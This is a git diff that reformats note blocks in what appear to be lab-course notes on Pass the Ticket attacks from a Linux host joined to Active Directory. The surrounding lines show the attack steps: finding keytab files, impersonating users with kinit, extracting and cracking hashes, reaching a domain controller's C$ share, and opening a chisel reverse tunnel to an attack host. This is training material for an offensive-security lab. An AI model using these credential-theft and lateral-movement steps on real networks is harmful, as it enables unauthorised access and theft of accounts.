@@ -54,7 +54,7 @@ A Linux computer connected to Active Directory commonly uses Kerberos as authent
 
 A Linux system can be configured in various ways to store Kerberos tickets. We'll discuss a few different storage options in this section.
 
-**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
+> **Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
 
 ---
 
@@ -68,7 +68,7 @@ Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/
 
 [Keytab](https://kb.iu.edu/d/aumh) files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.
 
-**Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
+> **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
 
 ---
 
@@ -186,12 +186,9 @@ david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
    262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
 ```
 
-<aside>
-<img src="https://www.notion.so/icons/code_gray.svg" alt="https://www.notion.so/icons/code_gray.svg" width="40px" />
 
-**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.
+> **Note:** To use a keytab file, we must have read and write (rw) privileges on the file.
 
-</aside>
 
 Another way to find `keytab` files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. Let's see this example:
 
@@ -217,12 +214,8 @@ In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/
 
 In this example, we found a script importing a Kerberos ticket (`svc_workstations.kt`) for the user `svc_workstations@INLANEFREIGHT.HTB` before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.
 
-<aside>
-<img src="https://www.notion.so/icons/code_gray.svg" alt="https://www.notion.so/icons/code_gray.svg" width="40px" />
+> **Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
 
-**Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
-
-</aside>
 
 ---
 
@@ -271,12 +264,8 @@ KVNO Timestamp           Principal
 
 The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.
 
-<aside>
-<img src="https://www.notion.so/icons/code_gray.svg" alt="https://www.notion.so/icons/code_gray.svg" width="40px" />
+> **Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.
 
-**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.
-
-</aside>
 
 ### **Impersonating a User with a keytab**
 
@@ -313,7 +302,7 @@ david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
                 7706623 blocks of size 4096. 4452852 blocks available
 ```
 
-**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.
+> **Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.
 
 ### **Keytab Extract**
 
@@ -339,12 +328,8 @@ david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfil
 
 With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
 
-<aside>
-<img src="https://www.notion.so/icons/code_gray.svg" alt="https://www.notion.so/icons/code_gray.svg" width="40px" />
+> **Note:** A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
 
-**Note:** A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
-
-</aside>
 
 The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.
 
@@ -467,12 +452,9 @@ root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
                 7706623 blocks of size 4096. 4447612 blocks available
 ```
 
-<aside>
-<img src="https://www.notion.so/icons/code_gray.svg" alt="https://www.notion.so/icons/code_gray.svg" width="40px" />
 
-**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
+> **Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
 
-</aside>
 
 ---
 
@@ -538,12 +520,7 @@ C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
 ```
 
-<aside>
-<img src="https://www.notion.so/icons/code_gray.svg" alt="https://www.notion.so/icons/code_gray.svg" width="40px" />
-
-**Note:** The client IP is your attack host IP.
-
-</aside>
+> **Note:** The client IP is your attack host IP.
 
 Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.
 
